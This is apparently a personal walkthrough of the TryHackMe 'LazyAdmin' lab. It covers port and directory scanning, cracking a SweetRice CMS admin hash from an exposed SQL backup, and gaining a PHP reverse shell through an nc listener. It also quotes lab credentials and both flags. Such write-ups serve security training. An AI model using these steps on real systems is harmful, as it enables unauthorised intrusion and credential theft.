https://tryhackme.com/room/lazyadmin
Machine IP: 10.10.120.162


nmap -sC -sC -Pn 10.10.120.162
 Port 22 on initial scan.
-sV reveals port 80 now.
└─$ nmap -sV 10.10.120.162          
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-14 12:59 EST
Nmap scan report for 10.10.120.162
Host is up (0.089s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.39 seconds


Website justshows an apache2 default page?   May need to look up exploits for apache default.
Going to run gobuster.


Found  You should replace this file (located at /var/www/html/index.html) before continuing to operate your HTTP server.           Which may be a hint. 
Also side note, looing for any config file or username and pass providing in the server.   
──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.120.162 -w  /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.120.162
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/14 13:02:04 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/content              (Status: 301) [Size: 316] [--> http://10.10.120.162/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 278]
Progress: 4581 / 4615 (99.26%)
===================================
                          http://10.10.120.162/content/



Reveals
Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed
No robots.txt
Going to read more from the index page. Most of my searches through the index are being blokcved or unable to be found?
Going to further enumerate the content page with go buster.

Found http://10.10.120.162/content/_themes/default/

Found alist of php files that may be exploitable. 
Location. http://10.10.120.162/content/_themes/default/
Going to look for more clues. 

http://10.10.120.162/content/as/ found a login 
http://10.10.120.162/content/inc/ more php nfo and some txt and other files. 
http://10.10.120.162/content/inc/lastest.txt Contains 1.5.1


http://10.10.120.162/content/inc/htaccess.txt 
RewriteEngine On
RewriteBase %--%
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d

RewriteRule . index.php [L]
Need a way to reverse shell the php field. Found some information on sweetrice through allthethinbgs.
They say that on certain version versions of sweetrice, it may be susceptible to PHP file execution. Cool thing is that the version matches the one we found earlier. 1.5.1
Found out that mysql bvackups are stoered in sweeetrice in the version/inc/mysql_backup, which may contain good contents.
Checked and nothing http://10.10.120.162/inc/mysql_backup, remembering the contentpage, this worked. 

http://10.10.120.162/content/inc/mysql_backup/
Found 
	mysql_bakup_20191129023059-1.5.1.sql
2019-11-29 12:30	4.7K

Need a way to read the sql file. Can just open the file in note pad.  
Contains 
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
  18 => 'CREATE TABLE `%--%_posts` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` longtext NOT NULL,
  `keyword` varchar(255) NOT NULL DEFAULT \'\',
  `tags` text NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT \'\',
  `sys_name` varchar(128) NOT NULL,

  `date` int(10) NOT NULL DEFAULT \'0\',
  `category` int(10) NOT NULL DEFAULT \'0\',
  `in_blog` tinyint(1) NOT NULL,
  `views` int(10) NOT NULL,
  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `sys_name` (`sys_name`),
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>



I was correct. The hash highlighted has a password of 

Password123
What is the username? Just admin or manager?
Going back to the login. http://10.10.120.162/content/as/ 

Got it. 
{Screenshot1}


It was manager Password123
Now that we have access to the dev page, we need to setup a reverse shell to see what on the server for the user.txt. Oing off of what we ave done before, we need to setup nc and setup a reverse shell listener on the site. 
We also have 
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                               | php/webapps/40700.html

As a hint.
Using as the listener php file, wont be filtered because we are admin for note.

Starting at the post section and going to add the malicious php file to the website. 
{Screenshot 2}
{Screenshot 3}




I have the file uploaded, but no listener. Going to restart. Same thing, buts its timing out. I think php5 is being filtered or denied by defaulter. 
Tried phtml same thing.
Had some formatting issues with php5, php and phptml but it seems phptml seems to work fine.
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.6.7.227] from (UNKNOWN) [10.10.120.162] 58646
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 20:51:49 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ 

Found the user text with 
$ cd /home                                     
$ ls
itguy
$ less itguy
itguy is a directory
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ less user.txt



THM{63e5bce9271952aad1113b6f1ac28a07}



What is the root flag?
Did the classic sudo -l and ls -la and we have 
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ 

$ ls -la
total 148
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
drwx------  3 itguy itguy 4096 Nov 29  2019 .local
drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
$ less mysql_login.txt
rice:randompass
$ 
Found the file -rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
Needed some hel;p with the perl command with backup.pl.  

THM{6637f41d0177b6f37cb20d775124699f}
